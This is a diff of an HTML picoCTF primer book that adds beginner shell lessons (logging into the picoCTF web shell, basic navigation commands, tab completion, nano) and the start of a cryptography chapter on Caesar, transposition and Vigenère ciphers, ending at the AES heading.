@@ -445,10 +445,12 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 <li><a href="#_introduction">1. Introduction</a></li>
 <li><a href="#_the_shell">2. The Shell</a>
 <ul class="sectlevel2">
-<li><a href="#shl">2.1. Symbol of the Hacker</a></li>
+<li><a href="#_symbol_of_the_hacker">2.1. Symbol of the Hacker</a></li>
 <li><a href="#_got_shell">2.2. Got Shell?</a></li>
-<li><a href="#_what_the_shell">2.3. What the Shell!?</a></li>
-<li><a href="#shl-what-the-shell">2.4. Get a Shell</a></li>
+<li><a href="#_get_a_shell">2.3. Get a Shell</a></li>
+<li><a href="#_gui_fu_to_shell_fu">2.4. GUI-fu to Shell-fu</a></li>
+<li><a href="#_what_the_shell">2.5. What the Shell!?</a></li>
+<li><a href="#_conclusion">2.6. Conclusion</a></li>
 </ul>
 </li>
 <li><a href="#_programming_in_python">3. Programming in python</a>
@@ -470,6 +472,27 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 <li><a href="#_javascript">4.2. JavaScript</a></li>
 <li><a href="#_server_code">4.3. Server code</a></li>
 <li><a href="#_cross_site_scripting_xss">4.4. Cross Site Scripting (XSS)</a></li>
+</ul>
+</li>
+<li><a href="#_cryptography">5. Cryptography</a>
+<ul class="sectlevel2">
+<li><a href="#_substitution_ciphers">5.1. Substitution ciphers</a></li>
+<li><a href="#_transposition_ciphers">5.2. Transposition ciphers</a></li>
+<li><a href="#_key_ciphers">5.3. Key ciphers</a></li>
+<li><a href="#_modern_cryptography">5.4. Modern cryptography</a></li>
+</ul>
+</li>
+<li><a href="#_6_the_network">6. 6 The Network</a>
+<ul class="sectlevel2">
+<li><a href="#_network_layers">6.1. Network Layers</a></li>
+<li><a href="#_sniffing_and_attack_example">6.2. Sniffing and attack example</a></li>
+</ul>
+</li>
+<li><a href="#_infiltrating_in_a_database">7. Infiltrating in a database</a>
+<ul class="sectlevel2">
+<li><a href="#_sql">7.1. SQL</a></li>
+<li><a href="#_basic_sql_injection">7.2. Basic SQL injection</a></li>
+<li><a href="#_blind_sql_injection">7.3. Blind SQL injection</a></li>
 </ul>
 </li>
 </ul>
@@ -509,8 +532,25 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 <div class="sect1">
 <h2 id="_the_shell">2. The Shell</h2>
 <div class="sectionbody">
+<div id="shl" class="paragraph">
+<p>The Shell is foundational to so many parts of securing computing devices and
+their networks. Intimidating and alluring (like most symbols enshrined by film
+makers), understanding the shell can make or break one&#8217;s ability to solve
+challenges in a capture-the-flag competition like picoCTF.</p>
+</div>
+<div class="paragraph">
+<p>To be transparent, I (LT) am still learning a lot about the shell, and I&#8217;m
+just about 10 years into it right now! This is an encouragement - anyone
+curious enough to jump into rabbitholes here and there is always going to have
+opportunities to learn more about an amazing tool like the shell. But rest
+assured, I was proficient in the shell long ago and it does not take very much
+time before the shell starts working for <strong>you</strong>.</p>
+</div>
+<div class="paragraph">
+<p>Next up, what is that mystique unique to the hacker and their shell?</p>
+</div>
 <div class="sect2">
-<h3 id="shl">2.1. Symbol of the Hacker</h3>
+<h3 id="_symbol_of_the_hacker">2.1. Symbol of the Hacker</h3>
 <div id="shl-symbol-of-the-hacker" class="paragraph">
 <p>A blank, black screen and blinking cursor. Lines and lines of scrolling text
 and someone in front of that screen who seemingly understands an
@@ -540,7 +580,8 @@ two things are a dangerous combination.</p>
 <div class="olist arabic">
 <ol class="arabic">
 <li>
-<p>Using a pointer such as a mouse, touchpad or finger to select apps or buttons</p>
+<p>Using a pointer such as a mouse, touchpad or finger to select apps, files,
+or buttons</p>
 </li>
 <li>
 <p>Using keys on a keyboard to enter simple or complex commands (the Shell)</p>
@@ -569,45 +610,483 @@ briefly refer to the interface that everyone knows about on computing devices
 that is driven by a pointer on a screen.</p>
 </div>
 <div class="paragraph">
-<p>Below is a screenshot of a shell after successful login and before the user as
-typed in any</p>
+<p>Below is a screenshot of a shell after successful login and before the user has
+typed in any commands:</p>
 </div>
-<div class="imageblock text-center">
+<div id="first-look" class="imageblock text-center">
 <div class="content">
-<img src="../images/shl-1-first-look-shell.png" alt="shl 1 first look shell">
+<img src="images/shl-1-first-look-shell.png" alt="shl 1 first look shell">
 </div>
+<div class="title">Figure 1. The shell waiting for a command</div>
 </div>
 <div class="paragraph">
-<p>\[explanation of user/machine/folder/$\]</p>
+<p>In the picture above, there is a lot of empty space, and even the line of text
+that exists, does not provide a lot of clarity. The situation is simpler than
+how it looks. There are only 3 pieces of information in the screenshot above,
+and you would likely recognize at least one of them if it were <strong>you</strong> who logged
+on:</p>
+</div>
+<div class="paragraph">
+<p>From left to right in the shell command line prompt:</p>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>What does <code>Q0h313th</code> mean?</p>
+<div class="ulist">
+<ul>
+<li>
+<p>Answer: <a href="https://gist.github.com/syreal17/a000b3ac491b80bfabb6ab80491b66e5" class="bare">https://gist.github.com/syreal17/a000b3ac491b80bfabb6ab80491b66e5</a></p>
+</li>
+</ul>
+</div>
+</li>
+<li>
+<p>What does <code>pico-2019-shell1</code> mean?</p>
+<div class="ulist">
+<ul>
+<li>
+<p>Answer: <a href="https://gist.github.com/syreal17/2152a545457f7f83a11006139e5a04f1" class="bare">https://gist.github.com/syreal17/2152a545457f7f83a11006139e5a04f1</a></p>
+</li>
+</ul>
+</div>
+</li>
+<li>
+<p>What does <code>~</code> mean?</p>
+<div class="ulist">
+<ul>
+<li>
+<p>Answer: <a href="https://gist.github.com/syreal17/8b4bdf7bd0b35a7196b73c02c31c0ec2" class="bare">https://gist.github.com/syreal17/8b4bdf7bd0b35a7196b73c02c31c0ec2</a></p>
+</li>
+</ul>
+</div>
+</li>
+<li>
+<p>What does <code>$</code> mean?</p>
+<div class="ulist">
+<ul>
+<li>
+<p>Answer: <a href="https://gist.github.com/syreal17/dc1340fef44be3dc59819e3379c3fe28" class="bare">https://gist.github.com/syreal17/dc1340fef44be3dc59819e3379c3fe28</a></p>
+</li>
+</ul>
+</div>
+</li>
+</ol>
+</div>
+<div class="paragraph">
+<p>In terms of raw power, Q0h313th could delete every file they own on this
+machine with one command. That&#8217;s almost never desireable, and I will wait to
+show this command until there is something useful and desireable to do with it.
+In terms of useful power, Q0h313th could create a copy of an entire website for
+use when there is no accessible WiFi. That&#8217;s using the command <code>wget</code>.</p>
+</div>
+<div class="paragraph">
+<p>Now let&#8217;s talk about <strong>getting</strong> a shell!</p>
 </div>
 </div>
 <div class="sect2">
-<h3 id="_what_the_shell">2.3. What the Shell!?</h3>
-
-</div>
-<div class="sect2">
-<h3 id="shl-what-the-shell">2.4. Get a Shell</h3>
+<h3 id="_get_a_shell">2.3. Get a Shell</h3>
 <div id="shl-get-a-shell" class="paragraph">
 <p>Cybersecurity is a topic that is most deeply learned by listening <strong>and</strong> doing.
 For this reason, I advise you to create a picoCTF 2019 account at this time if
 you have not already. Beyond providing 120+ security challenges in helpful
 learning ramps, every picoCTF 2019 account gets a user on a Linux server, which
-can only be accessed with a shell. Register here:</p>
+can only be accessed with a <em>shell</em>.</p>
+</div>
+<div class="paragraph">
+<p>A note on the structure of my (LT&#8217;s) chapters: many times I will provide a high
+level tutorial for a task and also a step by step walkthrough for the same
+task.  This is my attempt at accomodating different learning styles, different
+levels of experience or whatever else.  Typically, the high level walkthrough
+is more for learners who already know the basics but need a refresher or need a
+reminder about the particulars when it comes to this Primer. The step by step
+walkthrough is more for learners who have never ventured in a particular sort
+of task before. Of course, you must choose your own path here, but the safest
+bet may be to read the high level walkthrough but actually put hands to
+keyboard for the step by step walkthrough.</p>
+</div>
+<div class="sect3">
+<h4 id="_high_level_tutorial">2.3.1. High level tutorial</h4>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p><strong>Gain access to a practice shell</strong></p>
+<div class="olist loweralpha">
+<ol class="loweralpha" type="a">
+<li>
+<p>Register for a picoCTF 2019 account</p>
+<div class="ulist">
+<ul>
+<li>
+<p>Click link in email that is sent to registered email address</p>
+</li>
+</ul>
+</div>
+</li>
+<li>
+<p>Register account on picoCTF 2019 shell server</p>
+<div class="olist lowerroman">
+<ol class="lowerroman" type="i">
+<li>
+<p>Log in once to create account on shell server</p>
+<div class="ulist">
+<ul>
+<li>
+<p>Only required for first login for your account</p>
+</li>
+</ul>
+</div>
+</li>
+<li>
+<p>Reconnect</p>
+</li>
+<li>
+<p>Log in again to get a shell</p>
+</li>
+</ol>
+</div>
+</li>
+</ol>
+</div>
+</li>
+</ol>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_step_by_step_walkthrough">2.3.2. Step by Step Walkthrough</h4>
+<div class="paragraph">
+<p><strong>Register for a picoCTF 2019 account at the link below.</strong> You will need to
+validate the email address you provide by clicking on a link that is sent to
+it.</p>
 </div>
 <div class="paragraph">
 <p><a href="https://2019game.picoctf.com/" class="bare">https://2019game.picoctf.com/</a></p>
 </div>
 <div class="paragraph">
 <p>After successfully registering, a web shell can be accessed at the URL below.
-Use the same  user name and password that you registered on the picoCTF 2019
-website with.</p>
+<strong>Use the same  user name and password that you registered on the picoCTF 2019
+website to log into the shell at the link below</strong> (or in the "Shell" tab in the
+picoCTF 2019 website) For the sake of security, you will not see your password
+as you type it in. <strong>You will log in twice.</strong> This is only for your first log
+in.</p>
 </div>
 <div class="paragraph">
 <p><a href="https://2019game.picoctf.com/shell" class="bare">https://2019game.picoctf.com/shell</a></p>
 </div>
 <div class="paragraph">
-<p>Follow the instructions to effectively login in twice, which is only needed the
-first login. After that, logging in once will get you into the shell server.</p>
+<p>You will know you&#8217;ve successfully logged into the shell if you see a screen
+similar to this:</p>
+</div>
+<div id="pico-successful-login" class="imageblock text-center">
+<div class="content">
+<img src="images/shl-2-pico-motd-login.png" alt="shl 2 pico motd login">
+</div>
+<div class="title">Figure 2. Lots of extra info! Try the <code>clear</code> command!</div>
+</div>
+<div class="paragraph">
+<p>Not as sterile as the empty shell I pictured <a href="#first-look">here</a>. However, if
+you type <code>clear</code> and press enter, it will be quite pristine! All of the info
+that is pictured directly above is mostly for system administrators
+(sysadmins). You can safely ignore it.</p>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_debrief">2.3.3. Debrief</h4>
+<div class="paragraph">
+<p>Congratulations (esp. if this is your first time staring at a command prompt)!
+The next section focuses on demystifying the shell by relating its usage to
+devices you&#8217;ve probably already used for years; and if not, you&#8217;ll join the
+ranks of those whose first language is Shell.</p>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_gui_fu_to_shell_fu">2.4. GUI-fu to Shell-fu</h3>
+<div id="shl-gui-fu-to-shell-fu" class="paragraph">
+<p>Our first language as children, whether Spanish, English or anything else
+primarily for communication with other humans, likely took little conscious
+effort on our part. For anyone who has learned a second language, it was quite
+the opposite: very little - if anything - came naturally. Learning Shell for
+someone who has only "spoken" GUI is like learning a second language. This is
+good news and bad news. The good news is that Shell and GUI are languages for
+something you&#8217;ve been using for probably years, but the bad news is there is a
+whole new vocabulary with only a handful of cognates (words that sound and mean
+the same in both langauges) here and there.</p>
+</div>
+<div class="paragraph">
+<p>The basic computer operations that everyone is familiar with in GUI&#8217;s can
+easily be done in the shell as well. Here&#8217;s some of the most common operations
+for anyone using a computing device:</p>
+</div>
+<table class="tableblock frame-all grid-all stretch">
+<caption class="title">Table 1. Basic computer operations</caption>
+<colgroup>
+<col style="width: 20%;">
+<col style="width: 20%;">
+<col style="width: 20%;">
+<col style="width: 20%;">
+<col style="width: 20%;">
+</colgroup>
+<thead>
+<tr>
+<th class="tableblock halign-left valign-top">Operation</th>
+<th class="tableblock halign-left valign-top">GUI action</th>
+<th class="tableblock halign-left valign-top">Shell action</th>
+<th class="tableblock halign-left valign-top">Shell example</th>
+<th class="tableblock halign-left valign-top">Note</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Start app</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Click or touch icon of app</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Type name of app and press enter</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><code>$ date</code></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Pressing the Enter key sends the command to the shell to run and return.</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Open file</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Browse to file, click</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Use <code>cat</code> app to print file</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><code>$ cat ~/my-file.txt</code></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><code>cat</code> displays all text in a file.</p></td>
+</tr>
+<tr>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Download app</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Browse app store, click</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Use <code>apt</code> to download app</p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock"><code>$ apt install chessx</code></p></td>
+<td class="tableblock halign-left valign-top"><p class="tableblock">Install ChessX game. The hard part was finding a relevant package name.</p></td>
+</tr>
+</tbody>
+</table>
+<div class="paragraph">
+<p>As the table above shows, using a GUI involves browsing and clicking, while
+using a shell involves knowing a good app to use. Google has made finding the
+right app for a shell interface much easier than it was years ago. As always
+for CTF&#8217;s, Google is your friend! However, more direct resources can be even
+more helpful, such as this website below that quickly explains shell commands:</p>
+</div>
+<div class="paragraph">
+<p><a href="https://explainshell.com/explain?cmd=date" class="bare">https://explainshell.com/explain?cmd=date</a></p>
+</div>
+<div class="paragraph">
+<p>However, things do not always go as planned. The next section deals with
+those sorts of situations that inevitably arise.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_what_the_shell">2.5. What the Shell!?</h3>
+<div id="shl-what-the-shell" class="paragraph">
+<p>The main severity in the learning curve with the shell is that you must know
+the apps and commands available to you either by memorization or by looking
+them up when you need them. Certainly it is faster to memorize as many as
+possible.</p>
+</div>
+<div class="paragraph">
+<p>The other challenge is the amount of typing that sometimes must be done to
+reference the intended file.</p>
+</div>
+<div class="paragraph">
+<p>Lastly, interfacing with apps also requires memorizing or looking up names of
+parameters or arguments.</p>
+</div>
+<div class="paragraph">
+<p>To summarize, some of the most challenging aspects of using the shell:</p>
+</div>
+<div class="olist arabic">
+<ol class="arabic">
+<li>
+<p>Memorizing commands (aka apps/programs)</p>
+</li>
+<li>
+<p>Typing out long commands</p>
+</li>
+<li>
+<p>Memorizing arguments for commands</p>
+</li>
+</ol>
+</div>
+<div class="sect3">
+<h4 id="_challenge_1_memorizing_commands">2.5.1. Challenge 1: Memorizing commands</h4>
+<div class="paragraph">
+<p>Having a cheatsheet with shell commands listed is a must for overcoming the
+challenge of memorizing commands. Printing it out is an added bonus if
+possible! (Saves screen space). The cheat sheet linked below is very good!</p>
+</div>
+<div class="paragraph">
+<p><a href="https://www.git-tower.com/blog/command-line-cheat-sheet/" class="bare">https://www.git-tower.com/blog/command-line-cheat-sheet/</a></p>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_challenge_2_typing_out_long_commands">2.5.2. Challenge 2: Typing out long commands</h4>
+<div class="paragraph">
+<p>Many wonderfully brilliant students of mine have not known how to speed up
+their typing in the shell command prompt until thousands of picoCTF points into
+their learning. I take responsibility for this, and really, most of us go
+through that phase, but we do not have to! One word:</p>
+</div>
+<div class="paragraph">
+<p><strong>TAB</strong></p>
+</div>
+<div class="paragraph">
+<p>In the shell, pressing the TAB key invokes auto-complete by 1. assuming you&#8217;ve
+spelled the command or file correctly up to the point of pressing tab, and 2.
+completing the command of file name as much as it can.</p>
+</div>
+<div class="paragraph">
+<p>The functionality of auto-complete in the shell is so different from
+autocomplete in other apps, such as those in a phone, that shell auto-complete
+is often referred to as tab-complete. It takes some practice to get used to,
+but it is really worth the time as it probably cuts number of key presses in
+half!</p>
+</div>
+<div class="paragraph">
+<p>Unlike autocomplete for a soft keyboard on a phone, tab-complete is never
+wrong, however, this is mostly because it makes no guesses and only helps with
+completing commands and file paths and names. It hardly ever helps complete
+arguments to commands besides file names. If pressing tab doesn&#8217;t do anything,
+this is either because 1. there is no such command or file name to complete
+what you&#8217;ve already typed into the command prompt, or 2. there are multiple
+commands or file names that could complete what you&#8217;ve already typed into the
+command prompt. Try typing another letter or two. Hit the tab key again. If
+nothing more is completed, hit tab one more time. If nothing really happens
+besides an angry noise or flash, then there is no way to complete what you&#8217;ve
+already typed (maybe there is a typo?), but if the issue is that there are
+multiple possibilities for tab complete to choose, then these options will
+display after your second strike on the tab key. The double press of tab can
+be done at any time, but if there are hundreds of options then the shell will
+ask for your approval before printing all those options because that&#8217;s not
+usually very helpful.</p>
+</div>
+<div class="paragraph">
+<p>In the next section, I will guide you through some fundamental shell commands
+to start getting a sense for the world of the shell.</p>
+</div>
+</div>
+<div class="sect3">
+<h4 id="_shell_nav_exercise_1">2.5.3. Shell Nav Exercise 1</h4>
+<div class="listingblock">
+<div class="content">
+<pre class="pygments highlight"><code><span></span># SOME NOTES:
+# * text listed after &quot;$&quot; I mean for you to enter into the shell and then
+#   press enter
+# * text listed after &quot;#&quot; are comments from me to you but are ignored by
+#   the shell
+#
+# this short tutorial is meant to run through foundational shell commands
+# with brief explanations for each
+
+# the following command &quot;parks&quot; your shell in your home directory (which is
+# somewhere you can create files!)
+
+$ cd
+
+
+# the following command shows where your shell is parked
+
+$ pwd
+
+
+# the following command creates a new directory called &quot;tutorial&quot; where you
+# are currently parked
+
+$ mkdir tutorial
+
+
+# the following command moves your shell and parks it in the &quot;tutorial&quot; folder
+# you just created
+
+$ cd tutorial
+
+
+# pwd stands for &quot;print working directory&quot;. &quot;working directory&quot; is the
+# technical term for where one&#39;s shell is parked
+
+$ pwd
+
+
+# the following command creates an empty file with the name &quot;note.txt&quot;
+
+$ touch note.txt
+
+
+# the following command list the contents of your working directory
+
+$ ls
+
+
+# personally, I prefer a one column output of the contents of my working
+# directory, like
+
+$ ls -l
+
+
+# the following command shows the text content of &quot;note.txt&quot; (which is empty
+# right now)
+
+$ cat note.txt
+
+
+# the following command puts &quot;hello world! I&#39;m a snail&quot; into &quot;note.txt&quot;
+
+$ echo &quot;hello world! I&#39;m a snail&quot; &gt; note.txt
+
+
+# cat will print something now that there is content in &quot;note.txt&quot;
+
+$ cat note.txt
+
+
+# the following command makes a copy of &quot;note.txt&quot; called &quot;new-note.txt&quot;
+
+$ cp note.txt new-note.txt
+
+
+# what is in &quot;new-note.txt&quot;?
+
+$ cat new-note.txt
+
+
+# * the following command opens &quot;new-note.txt&quot; in a terminal text editor
+# * try changing the file, then press Ctrl-X to exit and save
+
+$ nano new-note.txt
+
+
+# if you were successful, this command should print the new content
+
+$ cat new-note.txt
+
+
+# if you were not successful, that is just fine. revisit this exercise after
+# some more reading and practice!</code></pre>
+</div>
+</div>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_conclusion">2.6. Conclusion</h3>
+<div class="paragraph">
+<p>You may have noticed that we did not cover overcoming challenge 3. If you are
+curious, look up the <code>man</code> command explained in this cheat sheet:</p>
+</div>
+<div class="paragraph">
+<p><a href="https://www.git-tower.com/blog/command-line-cheat-sheet/" class="bare">https://www.git-tower.com/blog/command-line-cheat-sheet/</a></p>
+</div>
+<div class="paragraph">
+<p>Using Google helps with learning commands to help solve problems in the shell,
+and also the "Expain Shell" website I linked to earlier in this chapter.</p>
+</div>
+<div class="paragraph">
+<p>There is so much to learn in the shell, but before learning more, my friend
+will continue as your guide in the next chapter on the Python programming
+language. Using the <code>nano</code> text editor app, as described in the tutorial
+above, you now have the skills to write programs in the shell!</p>
+</div>
+<div class="paragraph">
+<p>Let the Shell lessons sink in as you learn more about one of the most popular
+and powerful programming languages to grace the Earth.</p>
 </div>
 </div>
 </div>
@@ -651,11 +1130,13 @@ first login. After that, logging in once will get you into the shell server.</p>
 </div>
 <div class="listingblock">
 <div class="content">
-<pre class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">vim</span> <span class="tok-n">helloworld</span><span class="tok-o">.</span><span class="tok-n">py</span></code></pre>
+<pre class="pygments highlight"><code data-lang="python"><span></span><span class="tok-n">nano</span> <span class="tok-n">helloworld</span><span class="tok-o">.</span><span class="tok-n">py</span></code></pre>
 </div>
 </div>
-<div class="paragraph">
-<p>Remember that in vim to begin to type you must press ‘i’. To make our ‘hello world!’ program in python, it is just required one line of code! Simply write this on the file:</p>
+<div class="literalblock">
+<div class="content">
+<pre>To make our ‘hello world!’ program in python, it is just required one line of code! Simply write this on the file:</pre>
+</div>
 </div>
 <div class="listingblock">
 <div class="content">
@@ -663,15 +1144,7 @@ first login. After that, logging in once will get you into the shell server.</p>
 </div>
 </div>
 <div class="paragraph">
-<p>Now save the file in vim by pressing escape and then write</p>
-</div>
-<div class="listingblock">
-<div class="content">
-<pre class="pygments highlight"><code data-lang="python"><span></span><span class="tok-p">:</span><span class="tok-n">wq</span><span class="tok-err">!</span></code></pre>
-</div>
-</div>
-<div class="paragraph">
-<p>to save and close vim.</p>
+<p>Now save the file in nano by pressing 'control' and 'x' at the same time, and then press 'y', then 'enter'.</p>
 </div>
 <div class="paragraph">
 <p>Run the program on the terminal with:</p>
@@ -2015,10 +2488,1140 @@ Ref <a href="http://www.asciitable.com/" target="_blank" rel="noopener">http://w
 </div>
 </div>
 </div>
+<div class="sect1">
+<h2 id="_cryptography">5. Cryptography</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Cryptography is an ancient field that dates to the antique Rome. Etymologically, the word traces back to the Greek roots "kryptos" meaning "hidden" and "graphein" meaning "to write." It is used to communicate secretly in the presence of an enemy. With cryptography we can achieve the following properties when a message is sent:</p>
+</div>
+<div class="paragraph">
+<p>*Confidentiality: No one unintended will be able to read the message.</p>
+</div>
+<div class="paragraph">
+<p>*Integrity: If a message is tampered, it is possible to detect that it was.</p>
+</div>
+<div class="paragraph">
+<p>*Authentication: It can be verified accurately the identity of someone.</p>
+</div>
+<div class="paragraph">
+<p>*Non repudiation: If a person sent a specific message, then the person cannot deny that the message was sent by them.</p>
+</div>
+<div class="paragraph">
+<p>First we will see how to achieve Confidentiality. This is done with encryption. When we want to hide a message, we say that we encrypt the message. To understand how encryption works, we will see an example of an ancient way of encrypting a message that is not secure by any means today, but it is good for illustration.</p>
+</div>
+<div class="sect2">
+<h3 id="_substitution_ciphers">5.1. Substitution ciphers</h3>
+<div class="paragraph">
+<p>"Cipher" means a secret or disguised way of writing a message. It can be thought as the same as encryption. One cipher method invented in the antique Rome and named after the emperor Julious Caesar who used it for his private communication is Caesar&#8217;s cipher. This cipher simply substitutes each of the letters of a word by another one that is a certain number of positions further in the alphabet. That "certain number of positions" is called the shift. For example, if we have the word "hello" and we want to encrypt it using Caesar&#8217;s cipher with a shift of 3, we would replace the 'h' by 'k' because 'k' is 3 positions further in the alphabet, the 'e' by 'h' for the same reason, and so on. We called the original text we want to encrypt the cleartext or plaintext. The result of encrypting 'hello' using caesar&#8217;s with a shift of 3, is the following:</p>
+</div>
+<div class="paragraph">
+<p>cleartext &#8594; h e l l o</p>
+</div>
+<div class="paragraph">
+<p>Encrypted text &#8594; k h o o r</p>
+</div>
+<div class="paragraph">
+<p>"Decrypting", means obtaining the clear text from the encrypted text. For Caesar&#8217;s cipher we simply do the same but in reverse; we subtract 3 positions in the alphabet to each letter.</p>
+</div>
+<div class="paragraph">
+<p>Note that when we get to the end of the alphabet after adding positions while encrypting something, we simply overlap the alphabet. For example, to encrypt the letter 'z', we would encrypt it using the letter 'c'.</p>
+</div>
+<div class="paragraph">
+<p>To make sure you understand the decryption, decrypt the following text using caesar cipher with a shift of 3:</p>
+</div>
+<div class="paragraph">
+<p>s l f r f w i</p>
+</div>
+<div class="paragraph">
+<p>The result is something you probably know. Hint: the first decrypted letter is 'p' .</p>
+</div>
+<div class="paragraph">
+<p>Caesar&#8217;s cipher is a <strong>substitution cipher</strong>, because it replaces each letter by something else. In a substitution cipher, you don&#8217;t necessarily need to replace a letter by another letter. You can use any symbol, as long as you know how to reverse it.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_transposition_ciphers">5.2. Transposition ciphers</h3>
+<div class="paragraph">
+<p>In transposition ciphers, we don&#8217;t replace the letters by other symbols, but we simply change the order in which they appear on the cleartext. For example, we can decide that our encryption algorithm simply moves the letters to the right and overlaps. Let&#8217;s encrypt the word 'pico' by rotating its letters by one position to the right.</p>
+</div>
+<div class="paragraph">
+<p>clear text &#8594; p i c o</p>
+</div>
+<div class="paragraph">
+<p>encrypted text &#8594; o p i c</p>
+</div>
+<div class="paragraph">
+<p>This is a very simple kind of transposition. But you can have a map that makes more complicated transpositions. For instance, you can decide that you will encrypt a text by doing transpositions in chunks of 6 letters using the following mapping:</p>
+</div>
+<div class="paragraph text-center">
+<p><span class="image"><img src="images/5image1.png" alt="image" width="198" height="222"></span></p>
+</div>
+<div class="paragraph">
+<p>The number indicate the position of the letters. Using that mapping, let&#8217;s encrypt the word 'pico'. Since pico only has 4 letters, we can simply use a padding to complete until 6 letters. For this example, we will use the symbol * as padding, so we have:</p>
+</div>
+<div class="paragraph text-center">
+<p><span class="image"><img src="images/5image2.png" alt="image" width="198" height="222"></span></p>
+</div>
+<div class="paragraph">
+<p>The encrypted word is 'c*ip*o' using our arbitrarily defined mapping. Suppose we want to encrypt a long text. In that case we simply apply the same mapping each 6 characters.</p>
+</div>
+<div class="paragraph">
+<p>So far we saw how transposition and substitution ciphers work. If they are used only by themselves, they are very easy to crack. On the other hand, if someone finds out the algorithm we use to encrypt, the encryption is broken forever! A way to improve this, is by using encryption algorithms based on a key.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_key_ciphers">5.3. Key ciphers</h3>
+<div class="paragraph">
+<p>There is a principle in cryptography called the Kerckhoffs&#8217;s principle that states: "A cryptoststem should be secure even if everything about the system, except the key, is public knowledge". That principle pretends to overcome the fact that once the encryption algorithm is known by the enemy the encryption is broken. The solution is to use a key. One old algorithm that was used to encrypt data using a key was "Vigenere". It looks certainly stronger than the previous algorithms we learned. Even though it is easily breakable nowadays, in its time it was considered unbreakable.</p>
+</div>
+<div class="paragraph">
+<p>To understand how Vigenere works we will encrypt the cleartext:</p>
+</div>
+<div class="paragraph">
+<p>"I LOVE PITTSBURGH"</p>
+</div>
+<div class="paragraph">
+<p>First, we remove the spaces, because the Vigenere table does not have the  space. However, a human can easily recognize the words of a text even if it has no spaces. We get:</p>
+</div>
+<div class="paragraph">
+<p>"ILOVEPITTSBURGH"</p>
+</div>
+<div class="paragraph">
+<p>Now, we can pick a key. For this example, we will use the key "PICOCTF". Since our text is larger than the key, we simply repeat the key several times until we get the same length in the following manner:</p>
+</div>
+<div class="paragraph">
+<p>Plaintext: ILOVEPITTSBURGH</p>
+</div>
+<div class="paragraph">
+<p>Key: PICOCTFPICOCTFP</p>
+</div>
+<div class="paragraph">
+<p>The first letter of the cleartext is paired with the first letter of the key. So we have the pair ('I','P') Now in the vigenere table that is presented below, we use row i and column p. The cell at the intersection of the column and the row will be the encrypted letter, which in this case is X. We do the same for the rest of the letters, and we would obtain the following:</p>
+</div>
+<div class="paragraph">
+<p>Cleartext: ILOVEPITTSBURGH</p>
+</div>
+<div class="paragraph">
+<p>Key: PICOCTFPICOCTFP</p>
+</div>
+<div class="paragraph">
+<p>Encrypted text: XTQJGINIBUPWKLW</p>
+</div>
+<div class="paragraph">
+<p>Vigenere table:</p>
+</div>
+<div class="imageblock text-center text-center">
+<div class="content">
+<img src="images/5image45.png" alt="5image45" width="427" height="301">
+</div>
+</div>
+<div class="paragraph">
+<p>Now let&#8217;s see how decryption works. Suppose we only have the key and the encrypted:</p>
+</div>
+<div class="paragraph">
+<p>Key: PICOCTFPICOCTFP</p>
+</div>
+<div class="paragraph">
+<p>Encrypted text: XTQJGINIBUPWKLW</p>
+</div>
+<div class="paragraph">
+<p>We take the first letter of the key, which is 'P', and go to that row in the vigenere table. Then in the row 'P', we find the first letter of the encrypted text, which is 'X'.The column that corresponds to 'X', is the first letter of the clear text, in our case 'I'. You repeat the same process for each character until you get 'ILOVEPITSBURGH'.</p>
+</div>
+<div class="paragraph">
+<p>To verify that you understand the decryption, decrypt the encrypted text "WMNZQAJ" using the key "HELLO", remember that if the key is shorter, you just repeat it. You should obtain a word you will easily recognize!</p>
+</div>
+<div class="paragraph">
+<p>Vigenere is easily broken even without a computer. Simon Singh, a famous science communicator, has a nice tool on his website for cracking Vigenere:</p>
+</div>
+<div class="paragraph">
+<p><a href="https://www.simonsingh.net/The_Black_Chamber/vigenere_cracking_tool.html"><span class="underline">https://www.simonsingh.net/The_Black_Chamber/vigenere_cracking_tool.html</span></a></p>
+</div>
+<div class="paragraph">
+<p>Cracking ciphers is a field itself called cryptanalysis. Cryptanalysis and Cryptography compose bigger field called Cryptology.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="_modern_cryptography">5.4. Modern cryptography</h3>
+<div class="paragraph">
+<p>In modern cryptography exist the concept of symmetric and asymmetric cryptography. Symmetric cryptography means that you use the same key for encryption and decryption like we just did on Vigenere. In asymmetric cryptography you have two keys. One is for encryption, known as the public key, the other one is for decryption, known as the private key. Asymmetric cryptography is useful because it can be used to solve the problem of a key exchange. Additionally, it can be applied for digital signatures that provide integrity and non-repudiation.</p>
+</div>
+<div class="sect3">
+<h4 id="_symmetric_crypto_example_aes">5.4.1. Symmetric crypto example: AES</h4>
+<div class="paragraph">
